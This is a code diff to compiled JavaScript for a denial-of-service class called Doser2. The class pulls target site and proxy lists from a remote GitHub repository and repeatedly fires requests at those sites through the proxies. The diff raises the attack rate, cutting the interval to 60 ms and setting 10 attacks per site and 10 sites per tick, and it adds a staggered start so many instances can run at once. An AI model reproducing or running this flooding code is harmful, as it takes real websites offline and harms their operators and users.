@@ -43,15 +43,17 @@ exports.Doser2 = void 0;
 var axios_https_proxy_fix_1 = __importDefault(require("axios-https-proxy-fix"));
 var events_1 = require("events");
 var Doser2 = /** @class */ (function () {
-    function Doser2(onlyProxy, workersCount) {
+    function Doser2() {
         var _this = this;
         this.loadedTargetsAndProxies = null;
-        this.tickingIntervalTime = 2000;
-        this.attacksPerSite = 5;
+        // Attack settings
+        this.onlyProxy = true;
+        this.sitesPerTickCount = 10; // How many sites we attack each interval
+        this.tickingIntervalTime = 60;
+        this.attacksPerSite = 10; //Attacks per site from different proxies
+        this.randomStartTimeInterval = 100; // Setting used when you create many instances, additional interval before start
         this.requestsPromises = [];
-        this.onlyProxy = onlyProxy;
         this.working = false;
-        this.sitesPerTickCount = workersCount;
         this.eventSource = new events_1.EventEmitter();
         //Initialize data
         this.updateTargetsAndProxies();
@@ -82,12 +84,9 @@ var Doser2 = /** @class */ (function () {
                         return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })];
                     case 1:
                         sitesResponse = _a.sent();
-                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
-                            // https://www.wikipedia.org/
-                        ];
+                        return [4 /*yield*/, axios_https_proxy_fix_1.default.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })];
                     case 2:
                         proxyResponse = _a.sent();
-                        // https://www.wikipedia.org/
                         if (sitesResponse.status === 200 && proxyResponse.status === 200) {
                             sites = sitesResponse.data;
                             proxies = proxyResponse.data;
@@ -113,11 +112,13 @@ var Doser2 = /** @class */ (function () {
     Doser2.prototype.start = function () {
         var _this = this;
         this.working = true;
-        this.tickInterval = setInterval(function () {
-            _this.tick()
-                .then(function () { return console.log('Tick done'); })
-                .catch(function (e) { return console.error('Tick with error'); });
-        }, this.tickingIntervalTime);
+        setTimeout(function () {
+            _this.tickInterval = setInterval(function () {
+                _this.tick()
+                    .then(function () { return console.log('Tick done'); })
+                    .catch(function (e) { return console.error('Tick with error'); });
+            }, _this.tickingIntervalTime);
+        }, this.randomStartTimeInterval);
     };
     Doser2.prototype.stop = function () {
         this.working = false;
